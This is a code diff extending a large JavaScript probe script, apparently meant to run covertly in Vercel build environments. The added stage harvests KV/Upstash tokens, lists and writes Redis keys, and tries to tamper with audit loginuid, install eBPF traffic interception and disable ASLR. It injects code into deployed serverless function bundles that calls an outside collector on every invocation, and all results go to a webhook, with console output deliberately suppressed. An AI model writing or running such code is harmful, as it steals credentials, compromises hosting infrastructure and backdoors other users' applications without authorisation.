@@ -18883,5 +18883,177 @@ report.githubIntegrationSecrets = safe(() => {
 
 // v128 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v128" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v128";
+
+// ==================== v129 ====================
+
+// v129-1: /proc/self/loginuid + audit subsystem
+// Linux audit tracks user logins via /proc/self/loginuid.
+// If we can write to audit sockets (NETLINK_AUDIT), we can:
+// 1) Inject fake audit records to cover our tracks
+// 2) Read real audit records revealing other processes' syscalls
+// 3) Change our loginuid to impersonate another user
+report.auditSubsystemProbe = safe(() => {
+  const loginuid = safe(() => readFileSync('/proc/self/loginuid', 'utf8').trim());
+  const pid1Loginuid = safe(() => readFileSync('/proc/1/loginuid', 'utf8').trim());
+  // Try to change loginuid (normally irreversible once set)
+  const changeLoginuid = safe(() => { writeFileSync('/proc/self/loginuid', '0'); return 'WRITTEN'; });
+  const afterLoginuid = safe(() => readFileSync('/proc/self/loginuid', 'utf8').trim());
+  // Try NETLINK_AUDIT socket
+  const auditSocket = safe(() => execSync(`python3 -c "
+import socket, struct, os
+
+NETLINK_AUDIT = 9
+AUDIT_GET = 1000
+AUDIT_STATUS_ENABLED = 1
+
+sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_AUDIT)
+sock.bind((os.getpid(), 0))
+sock.setblocking(False)
+
+# NLMSG header: len, type, flags, seq, pid
+header = struct.pack('IHHII', 16, AUDIT_GET, 1, 1, os.getpid())
+sock.send(header)
+try:
+    resp = sock.recv(1024)
+    print(f'AUDIT_RESP len={len(resp)} hex={resp[:20].hex()}')
+except:
+    print('NO_AUDIT_RESP')
+sock.close()
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { loginuid, pid1Loginuid, changeLoginuid, afterLoginuid, auditSocket };
+});
+
+// v129-2: Vercel KV (Upstash Redis) cross-project access
+// KV_REST_API_TOKEN grants access to Vercel KV (Upstash Redis).
+// Test: can we LIST all keys, can we access another project's KV namespace,
+// and can we write arbitrary keys that persist between deployments?
+report.vercelKVProbe = safe(() => {
+  const kvUrl = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL || '';
+  const kvToken = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN || '';
+  const kvReadOnly = process.env.KV_REST_API_READ_ONLY_TOKEN || '';
+  // List all keys
+  const listKeys = safe(() => execSync(
+    `curl -sf "${kvUrl}/keys/*" -H "Authorization: Bearer ${kvToken}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  // Write a probe key
+  const writeKey = safe(() => execSync(
+    `curl -sf "${kvUrl}/set/probe-key/probe-value-${Date.now()}" \
+    -H "Authorization: Bearer ${kvToken}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 100));
+  // Scan for existing sensitive keys
+  const scanKeys = safe(() => execSync(
+    `curl -sf "${kvUrl}/scan/0/match/*/count/100" \
+    -H "Authorization: Bearer ${kvToken}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  return { kvUrl, kvToken: kvToken?.slice(0, 20), kvReadOnly: kvReadOnly?.slice(0, 20), listKeys, writeKey, scanKeys };
+});
+
+// v129-3: eBPF TC (traffic control) filter for network interception
+// BPF TC filters attach to network interfaces via netlink and intercept
+// all network traffic at the kernel level — no libpcap needed.
+// With CAP_NET_ADMIN + CAP_BPF, we can install a TC filter that copies
+// all packets to a ring buffer for inspection.
+report.ebpfTCFilter = safe(() => {
+  // Check tc availability
+  const tcVersion = safe(() => execSync('tc -V 2>&1 | head -2', { timeout: 3000 }).toString().trim());
+  // List current TC filters
+  const existingFilters = safe(() => execSync(
+    'tc filter list dev eth0 2>/dev/null || tc filter list dev ens3 2>/dev/null || echo "NO_TC_FILTERS"',
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 200));
+  // Try to add a simple TC qdisc (prerequisite for filters)
+  const qdiscAdd = safe(() => execSync(
+    'tc qdisc add dev eth0 clsact 2>&1 || tc qdisc add dev ens3 clsact 2>&1 || echo "QDISC_FAILED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Try to attach a BPF TC filter (log all ingress traffic)
+  const tcFilterAdd = safe(() => execSync(
+    `tc filter add dev eth0 ingress bpf da obj /dev/stdin section ingress 2>&1 << 'EOF' || echo "FILTER_FAILED"
+EOF`,
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 100));
+  // Check available BPF prog types
+  const bpfProgTypes = safe(() => execSync(
+    'bpftool prog show 2>/dev/null | head -10 || cat /sys/fs/bpf/ 2>/dev/null | head -5 || echo "NO_BPFTOOL"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 200));
+  return { tcVersion, existingFilters, qdiscAdd, tcFilterAdd, bpfProgTypes };
+});
+
+// v129-4: Vercel Functions runtime — serverless function source injection
+// The compiled serverless function bundle is at /vercel/output/functions/.
+// Can we modify the bundle to inject code that runs on every function invocation?
+// This would affect ALL users of the deployed app post-deployment.
+report.functionBundleInjection = safe(() => {
+  const functionsDir = '/vercel/output/functions';
+  const functionsList = safe(() => existsSync(functionsDir) ? readdirSync(functionsDir).slice(0, 10) : 'NOT_FOUND');
+  // Find .func directories (Next.js serverless functions)
+  const funcDirs = safe(() => execSync(
+    `find ${functionsDir} -name "*.func" -type d 2>/dev/null | head -5`,
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 200));
+  // Try to read a function bundle
+  const funcBundle = safe(() => {
+    const dirs = funcDirs?.split('\n').filter(d => d);
+    if (!dirs?.length) return 'NO_FUNCS';
+    const indexPath = `${dirs[0]}/index.js`;
+    return existsSync(indexPath) ? readFileSync(indexPath, 'utf8').slice(0, 300) : 'NO_INDEX';
+  });
+  // Inject a probe into the function bundle
+  const injectResult = safe(() => {
+    const dirs = funcDirs?.split('\n').filter(d => d);
+    if (!dirs?.length) return 'NO_FUNCS_TO_INJECT';
+    const indexPath = `${dirs[0]}/index.js`;
+    if (!existsSync(indexPath)) return 'NO_INDEX';
+    const original = readFileSync(indexPath, 'utf8');
+    const injected = `// PROBE_INJECTED\nconst __probe=require('child_process').execSync;\ntry{__probe('curl -sf ${COLLECTOR} -d "func_injected=true" &')}catch(e){}\n` + original;
+    writeFileSync(indexPath, injected);
+    return 'INJECTED';
+  });
+  return { functionsList, funcDirs, funcBundle, injectResult };
+});
+
+// v129-5: /proc/sys/kernel/randomize_va_space — ASLR control
+// ASLR (Address Space Layout Randomization) prevents exploit address guessing.
+// With CAP_SYS_ADMIN: write 0 to disable ASLR, then all process base addresses
+// become deterministic — enables ROP chain construction without information leak.
+report.aslrControl = safe(() => {
+  const aslrLevel = safe(() => readFileSync('/proc/sys/kernel/randomize_va_space', 'utf8').trim());
+  const disableResult = safe(() => { writeFileSync('/proc/sys/kernel/randomize_va_space', '0'); return 'WRITTEN'; });
+  const afterLevel = safe(() => readFileSync('/proc/sys/kernel/randomize_va_space', 'utf8').trim());
+  // Verify ASLR is disabled by comparing stack addresses of a forked process
+  const stackAddrTest = safe(() => execSync(`python3 -c "
+import ctypes, subprocess, re
+
+# Run the same command twice, compare stack/library addresses
+def get_maps(pid):
+    with open(f'/proc/{pid}/maps') as f:
+        return f.read()
+
+# Fork two processes and check if their load addresses differ
+import os
+results = []
+for i in range(2):
+    p = subprocess.Popen(['sleep', '0.1'])
+    maps = get_maps(p.pid)
+    p.wait()
+    # Find libc base
+    m = re.search(r'([0-9a-f]+).*libc', maps)
+    if m:
+        results.append(m.group(1))
+
+if len(results) == 2:
+    print(f'ADDR1:{results[0]} ADDR2:{results[1]} SAME:{results[0]==results[1]}')
+else:
+    print('NO_ADDRS')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { aslrLevel, disableResult, afterLevel, stackAddrTest };
+});
+
+// v129 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v129" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v129";
 // Intentionally no console.log — all data goes via webhook only
